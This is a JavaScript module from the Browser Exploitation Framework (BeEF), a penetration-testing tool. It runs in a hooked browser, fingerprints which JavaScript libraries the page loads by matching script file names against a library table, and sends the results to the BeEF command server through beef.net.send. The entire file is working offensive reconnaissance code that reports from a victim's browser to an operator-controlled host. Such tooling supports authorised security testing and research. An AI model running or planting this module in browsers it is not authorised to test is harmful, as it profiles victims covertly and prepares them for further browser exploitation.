//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
             
     //Regular expression to match script names in source 
     var regex = new RegExp('/\\w*\.(min\.)?js');
     var results = [];
     var urls = "";  

     Array.prototype.unique = function() {
         var o = {}, i, l = this.length, r = [];
         for(i=0; i<l;i+=1) o[this[i]] = this[i];
         for(i in o) r.push(o[i]);
         return r;
     };
     // Fingerprints of javascript /ajax libraries . Library Name: Array of common file names 
     
     var fingerprints = {
             "Prototype":new Array("prototype"),
             "script.aculous":new Array("builder","controls","dragdrop","effects","scriptaculous","slider","unittest"),
             "Dojo":new Array("dojo.uncompressed","uncompressed","dojo"),
             "DWR":new Array("auth","engine","util"),
             "Moo.fx/":new Array("Moo","Function","Array","String","Element","Fx","Dom","Ajax","Drag","Windows","Cookie","Json","Sortable","Fxpack","Fxutils","Fxtransition","Tips","Accordion"),
             "Rico": new Array("rico","ricoAjax","ricoCommon","ricoEffects","ricoBehaviours","ricoDragDrop","ricoComponents"),
             "Mootools":new Array("mootools","mootools-core-1.4-full","mootools-more-1.4-full"),
             "Mochikit":new Array("Mochikit"),
             "Yahoo UI!": new Array("animation","autocomplete","calendar","connection","container","dom","enevet","logger","menu","slider","tabview","treeview","utilities","yahoo","yahoo-dom-event"),
             "xjax":new Array("xajax","xajax_uncompressed"),
             "GWT": new Array("gwt","search-results"),
             "Atlas": new Array("AtlasRuntime","AtlasBindings","AtlasCompat","AtlasCompat2"),
             "jquery":new Array("jquery","jquery-latest","jquery-latest","jquery-1.5"),
             "ExtJS":new Array("ext-all"),
             "Prettify":new Array("prettify"),
             "Spry": new Array("SpryTabbedPanels","SpryDOMUtils","SpryData","SpryXML","SpryUtils","SpryURLUtils","SpryDataExtensions","SpryDataShell","SpryEffects","SpryPagedView","SpryXML"),
             "Google JS Libs":new Array("xpath","urchin","ga"),
             "Libxmlrequest":new Array("libxmlrequest"),
             "jx":new Array ("jx","jxs"),
             "bajax":new Array("bajax"),
             "AJS": new Array ("AJS","AJS_fx"),
             "Greybox":new Array("gb_scripts.js"),
             "Qooxdoo":new Array("qx.website-devel","qooxdoo-1.6","qooxdoo-1.5.1","qxserver","q","q.domain","q.sticky","q.placeholder","shCore","shBrushScript"),
               
     };

     function fp() {
        try{ 
            var sc = document.scripts;
            var urls ="";
            var source = ""
            if (sc != null){
                for (sc in document.scripts){
                    source =document.scripts[sc]['src'] || "";
                    if(source !=""){
                        //get the script file name and remove unnecessary endings and such
                        var comp = source.match(regex).toString().replace(new RegExp("/|.min|.pack|.uncompressed|.js\\W","g"),"");
                        for (key in fingerprints){
                            for (name in fingerprints[key]){
                            // match name in the fingerprint object 
                                if(comp==fingerprints[key][name]){
                                    results.push("Lib:"+key+" src:"+source);
                                }
                            }
                        }
                    }
                }
            }
            if(results.length >0){
                urls=results.unique().join('||');
                beef.net.send("<%= @command_url %>", <%=  @command_id %>, "script_urls="+urls);
            }
            else{
              beef.net.send("<%= @command_url %>", <%=  @command_id %>, "script_urls="+urls);
          } 
        }
        catch(e){
            results = "Fingerprint failed: "+e.message;
            beef.net.send("<%= @command_url %>", <%= @command_id %>, "script_urls="+results.toString());
        }
    }

    fp();

});
